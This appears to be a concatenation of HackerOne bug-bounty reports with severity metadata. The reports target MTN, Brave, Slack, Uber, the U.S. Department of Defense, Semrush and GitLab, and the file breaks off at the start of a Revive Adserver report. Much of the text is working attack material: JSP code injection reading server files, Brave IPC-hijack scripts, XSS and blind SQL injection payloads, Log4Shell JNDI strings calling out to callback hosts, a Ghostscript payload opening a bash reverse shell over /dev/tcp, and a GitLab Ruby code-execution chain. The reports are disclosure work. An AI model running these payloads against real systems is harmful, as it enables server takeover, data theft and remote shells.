+Multi-component: False
+Weaknesses:
+- Code Injection
+
+Contents:
+
+Summary:
+I intially found the debug console as a tool to insert arbitrary html/xss bugs, however after further probing the debug console it has some serious security flaws to allow arbitrary java code to be executed. My intial report of a seperate bug using this console, https://hackerone.com/reports/767077, uses the out.print functionality to write html code into the jsp page to perform a XSS attack. This intself is a dangerous bug for compromising users of the webapp. However, what is even more dangerous is allowing any abritratry java code to be executed on the server that an attacker controls. This is exactly what the debug console allows. The console spawns calls the execute.jsp page and then spawns a new .jsp page to give back to the user. Within this scope, the java code that the user/attacker writes is excuted on the server with the privellages given to the new .jsp file under the auspcies of the execute.jsp file. What does this mean? Well, an attacker can write custom .jsp files with native java code to do all sorts of malicous things, which includes Local File Inclusion and overwriting/changing source code - among other attacks.
+Steps To Reproduce:
+Visit: http://ptldynamicgame.mtn.sd/portal-api/tools/debug_console/index.jsp
+Write any java code you want to be excuted:
+PoC Java Code:
+out.print("LOCAL FILE DATA");
+out.print(":");%>
+<%@ page import="java.util.Random"%>
+<%@ page import="java.io.*"%>
+<%
+out.println("\n");
+File file = new File("/etc/mime.types");
+BufferedReader br = new BufferedReader(new FileReader(file));
+String st;
+while ((st = br.readLine()) != null)
+
+{ out.println(st); };%>
+<% out.println("Exit");
+Here please note the custom import of java.io.* for file reading purposes.
+As you can see, you can directly import native java code into the .jsp file by closing your opening tag %> and then using
+your own custom <% %> tags afterwords. At the end also note the <% to ensure the floating tag from the template jsp is closed
+Supporting Material/References:
+As stated in my intro, this is similar to my other reported bug found here https://hackerone.com/reports/767077 , but is actually quite different in its attack vector and impact. This represents a uniquely different bug due to the fact you are able to execute java code on the server and thus you are attacking the server rather than performing an XSS attack to target clients of the webapp. Overall, in my opinion these are two distinct bugs that just use the same console as its source. Also what is key to note is you do not have to get the current runtime enviroment of java to execute malicous commands, which in itself would be another crtical bug.
+Impact
+Overall the impact for this is critical. In my PoC I demonstrated how you can run attacker controlled java code to read local files, which in itself is a huge bug. However, the power of this bug comes from the ability to really craft the payload to do whatever an attacker desires on your site. Overall, this bug leads to Remote Code Execution which is critical to compromising a server.
+
+
+
+==================================================
+
+Report File: 187542.json
+------------------------------
+Report To: Brave Software
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Command Injection - Generic
+
+Contents:
+
+Summary:
+I found that Brave Browser allows to overwrite the internal js code from the user js code.
+Using this behavior, an attacker can send arbitrary IPC messages and do UXSS, address bar spoofing, changing browser settings and so on.
+Steps to Reproduce:
+1 . An attacker overwrites Function.prototype.call, like this:
+Code 196 Bytes
+1Function.prototype.call=function(e){
+2    if(e[0]&&e[0]=="window-alert"){
+3        e[0]="[ARBITRARY_IPC_MESSAGE_HERE]";
+4        e[1]="[ARBITRARY_IPC_MESSAGE_HERE]";
+5    }
+6    return this.apply(e);
+7}
+2 . An attacker calls alert().
+3 . Brave's alert() function calls Function.prototype.call in the internal code. At this time, the overwritten Function.prototype.call is used in the alert internal code.
+4 . Function.prototype.call receives IPC messages as arguments. This arguments are replaced to arbitrary messages by step 2's code. Thus, an attacker can send arbitrary IPC messages.
+PoC:
+I'd like to show three PoCs:
+UXSS PoC
+(If it goes well, you can see an alert dialog on google's domain.)
+Code 666 Bytes
+1<script>
+2Function.prototype.call=function(e){
+3    if(e[0]&&e[0]=="window-alert"){
+4        e[0]="dispatch-action";
+5        e[1]='{"actionType":"window-new-frame","frameOpts":{"location":"https://www.google.com/ncr"},"openInForeground":true}'
+6    }
+7    return this.apply(e);
+8}
+9alert();
+10
+11setTimeout(function(){
+12	for(var windowKey=0;windowKey<10000;windowKey++){
+13		Function.prototype.call=function(e){
+14			if(e && e[0] && e[0]=="window-alert"){
+15				e[0]="dispatch-action";
+16				e[1]=`{"actionType":"window-set-url","location":"javascript:alert('document.domain is: '+document.domain)","key":${windowKey}}`
+17			}
+18			return this.apply(e);
+19		}
+20		alert();
+21	}
+22},3000);
+23</script>
+Address Bar Spoofing PoC
+(If it goes well, you can see https://www.google.com/ in address bar.)
+Code 246 Bytes
+1<script>
+2Function.prototype.call=function(e){
+3	if(e && e[0] && e[0]=="window-alert"){
+4		e[0]="dispatch-action";
+5		e[1]='{"actionType":"window-set-navbar-input","location":"https://www.google.com/"}';
+6	}
+7	return this.apply(e);
+8}
+9alert();
+10</script>
+Change browser settings PoC
+(If it goes well, your home page is changed to http://attacker.example.com/ . You can see it in about:preferences. )
+Code 281 Bytes
+1<script>
+2Function.prototype.call=function(e){
+3    if(e[0]&&e[0]=="window-alert"){
+4        e[0]="dispatch-action";
+5        e[1]='{"actionType":"app-change-setting","key":"general.homepage","value":"http://attacker.example.com/"}'
+6    }
+7    return this.apply(e);
+8}
+9alert();
+10</script>
+FYI, Electron has similar issues. I reported it to Electron team and they are working on it.
+Could you confirm this bug?
+Thanks!
+
+
+
+==================================================
+
+Report File: 470637.json
+------------------------------
+Report To: Slack
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- None
+
+Contents:
+
+Summary
+GateKeeper/Quarantine bypass for downloaded files
+Lack of com.apple.quarantine meta-attribute for downloaded files allows a remote attacker to send an executable file that won't be checked by Gatekeeper .
+File opening doesn't trigger native alerts from GateKeeper/Quarantine
+Downloaded executable files lack com.apple.quarantine meta-attribute => no alerts about launching an executable from the web will appear.
+Code execution after opening
+Opening a downloaded .terminal file in Slack via "Shift + Click" (or in Finder) immediately leads to running attacker's code on a target device.
+.terminal file
+Opening leads to command execution.
+Looks safe - XML file.
+Downloaded .terminal file couldn't be opened if application sets quarantine meta-attribute properly. However, Slack (Direct Download) doesn't do that.
+Attack scenario
+Attacker sends exploit.terminal to the victim. File looks like a plaintext file in preview.
+Victim opens exploit.terminal file via "Shift + Click" (or via Finder)
+No alert from Gatekeeper about unsigned executable
+No alert about running executable file downloaded from the web
+Shell commands from exploit.terminal get executed with user-level privileges.
+Version
+Decribed scenario is reproducible in Slack 3.3.3 Direct Download.
+Slack from AppStore has correct quarantine rules and isn't vulnerable.
+Additional details
+exploit.terminal attached + Screencast attached.
+Quarantine
+macOS is build in such way that OS will ask user before opening any downloaded and potentially launchable (in default setup) files. This rule applies to .terminal files too.
+TL;DR:
+no quarantine -> exploit.terminal is launchable in 1 click without warning a user with popups
+quarantine -> no immediate launch for all files (2 popups) + no RCE is possible if GateKeeper level set to "AppStore only"
+Impact
+Impact
+Attacker could send a crafted .terminal file to the victim, which will be executed immediately after opening this file via "Open" button or in Finder.
+The attack scenario requires a certain level of user interaction.
+But the file looks safe and the victim doesn't expect that it'll be launched immediately
+Additional Impact
+GateKeeper bypass allows running arbitrary apps in environments hardened with Gatekeeper settings set to "AppStore only".
+
+
+
+==================================================
+
+Report File: 300080.json
+------------------------------
+Report To: Uber
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Cross-site Scripting (XSS) - Reflected
+
+Contents:
+
+Summary
+The _cc request parameter at the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint is copied into a javascript string encapsulated in double quotation marks, resulting in SSL-protected payloads being reflected unmodified in the application's response. The script-src whitelist at the endpoint includes a wildcard *.cloudfront.net host, which could be used by any attacker with an Amazon Web Services account to provision an arbitrary cloudfront.net host to serve trusted files from. The endpoint also has a missing base-uri, which allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. In addition to the reflected XSS issue, both the script-src and basi-uri issues are considered high severity findings under Content Security Policy 3.
+Security Impact
+Arbitrary SSL-protected XSS can be reflected unescaped from the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint, resulting in the ability for an attacker to generate arbitrary javascript and/or html content.
+Reproduction Steps
+https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?_cc=asdf"}}</script><script>alert(1)</script>
+Specifics
+The resulting unescaped content rendered:
+Code 310 Bytes
+1{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"_cc":"asdf\"}}</script><script>alert(1)</script>"},"useragent":{"ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36","browser":
+Impact
+With a properly crafted javascript and/or html page, an attacker could harvest Uber login and password credentials, credit card payment information etc.
+
+
+
+==================================================
+
+Report File: 1425565.json
+------------------------------
+Report To: MTN Group
+Severity: HIGH
+Complexity: HIGH
+Novelty: LOW
+Multi-component: False
+Weaknesses:
+- OS Command Injection
+
+Contents:
+
+Summary
+Hello,
+I would to like report this security flaw on https://mymtn.mtncongo.net. Using script nuclei i can found CVE-2021-44228. This is a critical issue cause as remote command execution. On my test i just retrive hostname of machine via nuclei script. (https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)
+Steps To Reproduce
+How we can reproduce the issue;
+run nuclei script via cmd; ./nuclei -u https://mymtn.mtncongo.net:8443 -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml
+It will retrive the hostname of machine on output " [net]"
+Like this;
+Code 172 Bytes
+1[2021-12-14 03:38:05] [CVE-2021-44228] [http] [critical] https://mymtn.mtncongo.net:8443/?x=${jndi:ldap://${hostName}.c6s11oscca8f9pc2lrggcghbdgeyyyd66.interact.sh/a} [net]
+Mitigation
+Update according the vendor and thecnical references..
+References
+https://www.tenable.com/blog/cve-2021-44228-proof-of-concept-for-critical-apache-log4j-remote-code-execution-vulnerability
+https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476
+Impact
+Remote command execution
+
+
+
+==================================================
+
+Report File: 2081316.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- SQL Injection
+
+Contents:
+
+Description:
+access
+https://████████/qsSearch.aspx
+Click to sort capture packets
+Code 4.69 KiB
+1POST /qsSearch.aspx HTTP/1.1
+2Host: ████████
+3Cookie: ASP.NET_SessionId=qrwzcesx1pczpna5a1bumabn; TS01e0cc7d=01a9fe659bc0aaa5aeffd1dcb0212ef4158c4865925e960169a653a233f6de5425138871ffe81b759d57e8cd4d192f460a8455c20a; TS64c50bb0027=085749d0e4ab2000abff03ce041a6de3cdc980bad78329f846f8a7d1a3ca714fca41b9f4477ff74908e5615eaa1130003df96bf750318bbc06de7b8d1dc03b675cf0ea51da191b5c8a95008b8d5b3f758c0ed139489903314d8927a8c58c8d9d
+4Content-Length: 3764
+5Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
+6Sec-Ch-Ua-Mobile: ?0
+7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+8Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+9Cache-Control: no-cache
+10X-Requested-With: XMLHttpRequest
+11X-Microsoftajax: Delta=true
+12Sec-Ch-Ua-Platform: "Windows"
+13Accept: */*
+14Origin: https://██████
+15Sec-Fetch-Site: same-origin
+16Sec-Fetch-Mode: cors
+17Sec-Fetch-Dest: empty
+18Referer: https://██████████/qsSearch.aspx
+19Accept-Encoding: gzip, deflate
+20Accept-Language: zh-CN,zh;q=0.9
+21Connection: close
+22
+23ScriptManager1=UpdatePanelWhole%7CGetFilteredButton&DocumentIDTextBox=&IDNumberTextBox=&DropDownListStatus=&DocumentTitleKeyWords=&DropDownListContains=AND&DropDownListTitleOrKeywords=TOS&TextBoxBegin_Date=24-Jul-2022&TextBoxEnd_Date=24-Jul-2023&FromSession_HFS=0&DocumentIDTextBox_HFS=&IDNumberTextBox_HFS=&DropDownListStatus_HFS=&DocumentTitleKeyWords_HFS=&DropDownListContains_HFS=&DropDownListTitleOrKeywords_HFS=&ExListBoxFSCHF=1010&ExListBoxFSCHFN=2&ExListBoxFSCHFN_HFS=&UseTransDateCheckBox_HFS=&TextBoxBegin_Date_HF=24-Jul-2022&TextBoxEnd_Date_HF=24-Jul-2023&TextBoxBegin_Date_HFS=24-Jul-2022&TextBoxEnd_Date_HFS=24-Jul-2023&Command_HFS=&divPreamble_HF=block&HiddenFieldSortOrder=seqno&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=q7mOdp7JADLouhLb0iBsjhyqsgYBjR4m66bmTYp5jGGY0Unk%2FoBSV%2FV5DY4cM8i4AetQ7yIP7NpGAwDZNg1mENuO17N0e9RMjj9k84Mz8Z12lbblsQ3pvMzMXGqVFlV5AapE1ZPF3Lw3mHyNQwU9U8rmLIlySVVc9Fq9r1FEk4E198exJH0aVmUhqMLdX6ah4%2F4jaTRYRASPB6C8VdKG2gvAnVsh%2BQzU05lZGLYsqw8j8EiFXbKKni0hgSjiD%2B%2BanYn9w4xMz5llIOP81jz9jSB479hqo3yuFWuOO91Vr539KvcO7XzstILWDgVLtDeDPw3p2DTZM2PS0vOVnNDpJX6rr76mJfFWD9DJUOSkvCDpz0tGwNcGWZPO0j%2FkaUY%2Fh9L5%2FOblr4Zd6XcWiyo3Sal%2BtCvQnZuzPyCjL33IEpuGojcsUBeY8Aq%2FkFbVr%2Be3cXUSzzBwirfXTdneWQFQlfq8xWxKI2YHsnLZHLNKB3%2FsgP0vvRV1yXvsbC9RfTGhUiK2S%2Bg4XHzadLggy5djNZMHvoulqRwagO7EeksJyWGma9jVCQoc4Vqe3IjRbjmyaZOltk%2BZxh%2FC9P%2BPdT9lhapBOyuXvVDJL862rRIIfJEUo9NJ0ES%2FRRHdk2NO44DsXT99Rj89iOZY1ZgFaAqQEYXhVQEIfFdyMjP52QR2d6ljjjQahESe88R34h9YuLQVGMnZnqwCSgOqjD%2Fw7iuA4fkYrq5zu2muXogAnT%2BYdVe03PNUlMAhdr3oVzTmipt2ezsMpNtGU%2B%2FKO67w8xvPtdMcU1r%2FDWXlU%2BMgnxpWKBfcwk8BMKvSStAX7lxPg%2BAFXJ4W%2B4mMAg6xybe8nfyVtfbcC%2FLT21%2FAo6DA1EP0%2Bquy6r7RSx%2BCSQiQ9FMEn29J%2FEvOYsub01L3h%2FHXt5%2BgfM9lWS1DRQmEbIT9Sy9aXm895QHjFJwR4ZKU%2FV2YqyvpqYxBstMen3tClb74MXUOGLEwkR2SajMOnEvafbc2eND%2BeGkhPvX308aFuCcS92UIOD0YE52Xf%2FvCaFkbYhBFQ3DDTvEsKYq%2Feiv2tdt3t34jpVDYpVuZBjYrE5CKYNZ%2FshSfBGFd3WkyogypS6WwmW4p8tAIP6nZbewu3ljQmfclpQfSEZ1U86hc7R6%2F8Qi5H%2FUoPZkSXdhS7YZ%2FUk2uEFJpMPbwrRIisJZDWOK1iXXUfLGlJNHpqXz%2By1HAWEAgoROMjB3PDciwlG4qOWWNf8kHBIXh4mABbQTBRCSviGCU%2B40mxFN5mCxIDlyVSrZtctMDlDEXxsDrgMlIYF9tPu14HiIkcvTvRRDAilxLNj4oJltCSn9Q4KaohPoOCTCB%2FBDChs7i%2FP%2FtVlVv2hseFoW%2FL5nnXrzZwtQ89g1tukB6B0%2BLNIHSPMTNjHfS94KBTjlI%2BDyJQ1moLRAqrI08LuxR5oL4I4xQWFMokDUes%2F9919T%2BsFFY83LeW8l2cnq9HXs1VHWZC52iEE6NKL3O%2FY8rb8ZzJWx73Vy6%2F4ycbMhmXmBKDL0jPp7pWQwCSF%2Bi3utC6fYzXYVplK%2F%2FUB%2Bl%2Fx3FHulj%2BxbNXbXDNwW9la1gvmiZCBVNBF8Hs9f723CNP9Mk36HeRhnqrv%2BXjT3ru9VUIreZuYLP%2FJMDsMa5hkxNqsGSiYSaVnQdNoh16MX%2FpwD9TFjeLR9trbuYbOe85Q%3D%3D&__VIEWSTATEGENERATOR=23D07230&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=fsWUuj%2Bv6uAzn%2BPDJy53TOV1EcwpGMzzgrX8HnHdm3%2BXLE0nnYzmv2wV%2FC1MQ36juB9R3FuomPHAhDRTQjaWLLfUo8wqsKkA5oRH27Q0drnd19OLne7P%2F1e7JVyrg3T7IUqgzt668Uf70ylQ0%2Fzm3R8l55e7NMhkJqrNAfwmRnqo01McSaS%2FfV2vktFK2Xg07rplRCRRnjFxz7PgRNyHTd27PGi2JuvyZ661dcSKhHjRUnOe2JvQjiSZRCepgNLisbabLxz3fm%2B1iLqiMbDSRQ%2B%2FD9NNzQ7zv3dFfSQUnFPX7n1%2BN1rxmuSYIrjumhEcO4WaCoted6V4GkC2aj2XlwuOdyJCc5KK83LLHqei%2FQ%2BOYJ70T2sxY5kfRDyc6T5%2BMoqHE6Xl9T6fgHQNss4Ed5vnM1hZ3wZQF2roYILiJnGRewNWVEtDjNbGId6AosGd%2BG8TPm5qmRver%2Fwe%2F61TFc7jVz6dKVS30uH7AAbYcbuytwOXLSNwGrfEQdJWBRfL0fof2hrE1%2BnpdhhTCaZr09ezPUk6vJZKXWxxwYfIcDAiy6VF696%2BrN1sK3DqQY2Ml1ycdVU9IGR7gt0JAr256BTzhp2JqdP3MUmPfzzJUb8yPVIdutWg4s6wd9hZJOffo1XGfM97vgmG31OsKt6Ce5%2Fnvd9EtqYThA73N7lRz3Rbia%2FoGCb%2BSZT%2Fgry9ERSpe772GIZgiIkfmmIH81KdA3ng3UGEUW%2BJQaJ1nqUpqa%2BkvQoXNYP6cgpyJXpqPUBh92Dur9tj6rGmgFWcHMly1EoNjkhmUq2A3Rx3Y4cv8%2F%2FFXK0Q3FHiGe838a3kotnxO5JySmyB%2FaV4pfNfyo0YVRk51Od9eE7%2FtAKgSe11mFqXg2cB0SEJn7JIhMBuozxVV6hW1ja2QpLVxqZxfar1K3Fw8gk%2FOcYpDaEVlE8MLzAft9GeMFoKWMCNXkY9jz80fSlJzDLSHEZ%2BVahTxgsrEeQpo9IzdKvvm2p6RPOYIS4%3D&__ASYNCPOST=true&GetFilteredButton=Search
+HiddenFieldSortOrder is sql injection parameter
+███
+payload：
+user length=5
+seqno-DECODE(length(user),5,1,1/0) The page returns normal data
+█████
+The length of the user is incorrect, and the page returns abnormal data
+████████
+and
+user=QSWEB
+seqno-DECODE(lpad（user,5),'QSWEB',1,1/0) The page returns normal data
+███
+The database user does not return abnormal data to the page
+███
+We can use the burp intruder template to violently enumerate database usernames .Judging whether the user is correct based on the returned length
+███
+█████
+References
+Impact
+An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.
+System Host(s)
+██████
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+seqno-DECODE(lpad(user,5),'QSWEB',1,1/0)
+true
+seqno-DECODE(lpad(user,5),'QSWE1',1,1/0)
+false
+Suggested Mitigation/Remediation Actions
+
+
+
+==================================================
+
+Report File: 403417.json
+------------------------------
+Report To: Semrush
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Command Injection - Generic
+
+Contents:
+
+The Logo upload in the report constructor at: https://www.semrush.com/my_reports/constructor
+<image_0>
+is passed through a not properly patched version of ImageMagick. You can use Postscript to get Ghostscript to run which in return allows to trigger arbitrary commands on the server, leading to Remote Code Execution. Tavis Ormandy has also mentioned recently that the policy.xml needs to disable EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript: http://openwall.com/lists/oss-security/2018/08/21/2
+The following PoC-payload was used to get a reverse shell when issuing the upload:
+Save it as test.jpg and upload it as an image for the logo:
+Code 180 Bytes
+1%!PS
+2userdict /setpagedevice undef
+3legal
+4{ null restore } stopped { pop } if
+5legal
+6mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/███/8080 0>&1') currentdevice putdeviceprops
+(█████ is the IP of my listener)
+This resulted in:
+Code 273 Bytes
+1█████████
+2██████████
+3ls
+4███████
+5██████████
+6app
+7████████
+8██████████
+9████
+10████████
+11██████
+12███
+13█████████
+14████████
+15██████
+16█████████
+17█████████
+18█████
+19██████████
+20█████
+21██████
+22█████████
+23███
+24█████
+25██████
+26████
+27█████
+28█████████
+29███████
+30████████
+31███
+32███
+33
+34
+35███
+36whoami
+37████
+38███████
+39██████
+At this point I wasn't sure if this was a third party or not, so I checked two things:
+██████ to list files in the ██████ dir. It showed me:
+Code 76 Bytes
+1█████████
+2███
+3████████
+4████████
+5███████
+6█████
+7████
+8█████████
+9████
+10██████████
+I navigated to
+Code 83 Bytes
+1https://www.semrush.com/my_reports/████
+2https://www.semrush.com/my_reports/████████
+And confirmed those two files exists in this directory.
+/etc/hosts
+This one confirmed it by:
+Code 78 Bytes
+1cat /etc/hosts
+2127.0.0.1 localhost
+3█████ ████.semrush.net ███
+4████████ ███████
+I'm certain this is a SEMrush-instance.
+{F340481}
+You should urgently make sure your policy.xml for imagemagick ONLY allows gif,jpg,png and nothing else.
+Regards,
+Frans
+Impact
+
+
+
+
+==================================================
+
+Report File: 415967.json
+------------------------------
+Report To: Brave Software
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: HIGH
+Multi-component: False
+Weaknesses:
+- Code Injection
+
+Contents:
+
+Summary:
+It's possible to navigate to the infamous 'chrome://brave' (and all other) privileged page from web, requiring only a single click. This is possible by opening popups with the 'noopener' attribute.
+Products affected:
+Brave: 0.24.0
+V8: 6.9.427.23
+rev: f657f15bf7e0e0c50a2b854c6b05edb59bfc556c
+Muon: 8.1.6
+OS Release: 10.0.17134
+Update Channel: Release
+OS Architecture: x64
+OS Platform: Microsoft Windows
+Node.js: 7.9.0
+Brave Sync: v1.4.2
+libchromiumcontent: 69.0.3497.100
+Steps To Reproduce:
+Host attached PoC from web
+Click button
+Impact
+This is a direct violation of SOP, we can open any URL of which chrome://brave is the worst as it could lead to RCE.
+
+
+
+==================================================
+
+Report File: 1125425.json
+------------------------------
+Report To: GitLab
+Severity: HIGH
+Complexity: HIGH
+Novelty: HIGH
+Multi-component: False
+Weaknesses:
+- Code Injection
+
+Contents:
+
+Summary
+When rendering wiki content with certain extensions such as .rmd, render_wiki_content will call other_markup_unsafe which will end up calling GitHub::Markup.render from the github-markup gem. Files with any extension can be uploaded by checking out the wiki with git, commiting the files and pushing the changes back.
+Since kramdown is loaded, this will end up using it for the markdown parser by calling Kramdown::Document.new(content).to_html
+Kramdown has a special extension that allows for options to be set inline, the example they give is: {::options auto_ids="false" footnote_nr="5" syntax_highlighter_opts="{line_numbers: true\}" /}
+The default syntax highlighter is rouge which has an option formatter that can be set via syntax_highlighter_opts in the inline options. This option gets used by formatter_class:
+Code 1.01 KiB
+1  def self.call(converter, text, lang, type, call_opts)
+2      opts = options(converter, type)
+3      call_opts[:default_lang] = opts[:default_lang]
+4      return nil unless lang || opts[:default_lang] || opts[:guess_lang]
+5
+6      lexer = ::Rouge::Lexer.find_fancy(lang || opts[:default_lang], text)
+7      return nil if opts[:disable] || !lexer || (lexer.tag == "plaintext" && !opts[:guess_lang])
+8
+9      opts[:css_class] ||= 'highlight' # For backward compatibility when using Rouge 2.0
+10      formatter = formatter_class(opts).new(opts)
+11      formatter.format(lexer.lex(text))
+12    end
+13
+14  def self.formatter_class(opts = {})
+15      puts "formatter"
+16      puts opts[:formatter]
+17      case formatter = opts[:formatter]
+18      when Class
+19        formatter
+20      when /\A[[:upper:]][[:alnum:]_]*\z/
+21        ::Rouge::Formatters.const_get(formatter)
+22      else
+23        # Available in Rouge 2.0 or later
+24        ::Rouge::Formatters::HTMLLegacy
+25      end
+26    rescue NameError
+27      # Fallback to Rouge 1.x
+28      ::Rouge::Formatters::HTML
+29    end
+So this a means that ::Rouge::Formatters.const_get(opts[:formatter]).new(opts) will be called, where opts is controllable via the inline options to kramdown, allowing ruby objects to be initialised so long as the validation of /\A[[:upper:]][[:alnum:]_]*\z/ passes. The validation slightly restricts things, but pretty much any class without a namespace (:: is not allowed) can be created. For example (the two ~~ should have an extra ~ but it's messing up the h1 formatting so will need to add it):
+Code 180 Bytes
+1{::options auto_ids="false" footnote_nr="5" syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: CSV, line_numbers: true\}" /}
+2
+3~~ ruby
+4    def what?
+5      42
+6    end
+7~~
+Will result in a CSV object being created and then it will error with private method 'format' called for #<CSV:0x00007fe4df7e26d0> as it tries to use this as the formatter.
+One of the loaded classes is gitlab is Redis from redis-rb which has an option driver that is used to load the driver class:
+https://github.com/redis/redis-rb/blob/v4.1.3/lib/redis/client.rb#L507
+Code 522 Bytes
+1    def _parse_driver(driver)
+2      driver = driver.to_s if driver.is_a?(Symbol)
+3
+4      if driver.kind_of?(String)
+5        begin
+6          require_relative "connection/#{driver}"
+7        rescue LoadError, NameError => e
+8          begin
+9            require "connection/#{driver}"
+10          rescue LoadError, NameError => e
+11            raise RuntimeError, "Cannot load driver #{driver.inspect}: #{e.message}"
+12          end
+13        end
+14
+15        driver = Connection.const_get(driver.capitalize)
+16      end
+17
+18      driver
+19    end
+As both require_relative and require allow for directory traversal, supplying a driver option such as ../../../../../../../../../../tmp/a.rb will cause that file to be evaluated.
+One of the ways to get a file to a known location in gitlab is to attach a file in the description of a snippet. When attaching, a markdown link will be created similar to: [file.rb](/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb). The default gitlab_rails['uploads_directory'] is /var/opt/gitlab/gitlab-rails/uploads meaning the final file location will be /var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb.
+Combining all of of this, we can create the following .rmd file to execute our payload (add ~ to both of the ~~):
+Code 282 Bytes
+1{::options auto_ids="false" footnote_nr="5" syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb\}" /}
+2
+3~~ ruby
+4def what?
+5  42
+6end
+7~~
+Steps to reproduce
+Create a new snippet with any title and file
+puts "hello from ruby"
+`echo vakzz was here > /tmp/vakzz`
+```
+Make note of the upload path: /uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb
+Create a new project
+Click Wiki and create a default home page
+Hit Clone repository to get the clone command
+{::options syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb\}" /}
+
+Push the changes git add -A . && git commit -m "page1.rmd" && git push
+Refresh the wiki, there should now be page1 of the right hand side
+Click and load page1
+wrong constant name ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb
+
+root@gitlab-docker:~# cat /tmp/vakzz
+
+Impact
+Allows any user with push access to a wiki to execute arbitrary ruby code.
+Examples
+Example page using the inline options to change the highlighter from rouge to minted - https://gitlab.com/vakzz-h1/kramdown-wiki/-/wikis/page1
+What is the current bug behavior?
+Inline options can be set when rendering kramdown documents
+What is the expected correct behavior?
+forbidden_inline_options could be use to disable the dangerous inline options - https://kramdown.gettalong.org/options.html
+Output of checks
+Results of GitLab environment info
+Code 850 Bytes
+1System information
+2System:
+3Proxy:		no
+4Current User:	git
+5Using RVM:	no
+6Ruby Version:	2.7.2p137
+7Gem Version:	3.1.4
+8Bundler Version:2.1.4
+9Rake Version:	13.0.3
+10Redis Version:	6.0.10
+11Git Version:	2.29.0
+12Sidekiq Version:5.2.9
+13Go Version:	unknown
+14
+15GitLab information
+16Version:	13.9.1-ee
+17Revision:	8ae438629fa
+18Directory:	/opt/gitlab/embedded/service/gitlab-rails
+19DB Adapter:	PostgreSQL
+20DB Version:	12.5
+21URL:		http://gitlab-docker.local
+22HTTP Clone URL:	http://gitlab-docker.local/some-group/some-project.git
+23SSH Clone URL:	git@gitlab-docker.local:some-group/some-project.git
+24Elasticsearch:	no
+25Geo:		no
+26Using LDAP:	no
+27Using Omniauth:	yes
+28Omniauth Providers:
+29
+30GitLab Shell
+31Version:	13.16.1
+32Repository storage paths:
+33- default: 	/var/opt/gitlab/git-data/repositories
+34GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
+35Git:		/opt/gitlab/embedded/bin/git
+Impact
+Allows any user with push access to a wiki to execute arbitrary ruby code.
+
+
+
+==================================================
+
+Report File: 1429014.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: HIGH
+Novelty: HIGH
+Multi-component: False
+Weaknesses:
+- Code Injection
+
+Contents:
+
+Hi team,
+log4 shell is recent 0-day exploit it's Java package vulnerable. ██████████ domain is vulnerable
+Impact
+RCE
+System Host(s)
+█████████
+Affected Product(s) and Version(s)
+CVE Numbers
+CVE-2021-44228
+Steps to Reproduce
+Go to this url => https://███████/██████=%24%7bjndi%3aldap%3a%2f%2fx%24%7bhostName%7d.LOG45200SSRF.xxxxxx.burpcollaborator.net%2fa%7d
+paste the poc code on ██████ url parameter
+like this => https://██████████/██████
+then burp collaborator received reverse ping back
+I attached poc videos and photos below
+POC CODE
+${jndi:ldap://x${hostName}.log4j.xxxxxxx.burpcollaborator.net/a}
+Suggested Mitigation/Remediation Actions
+https://www.lunasec.io/docs/blog/log4j-zero-day/
+
+
+
+==================================================
+
+Report File: 576504.json
+------------------------------
+Report To: Revive Adserver
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Improper Authentication - Generic
+
+Contents:
+
+Hi,
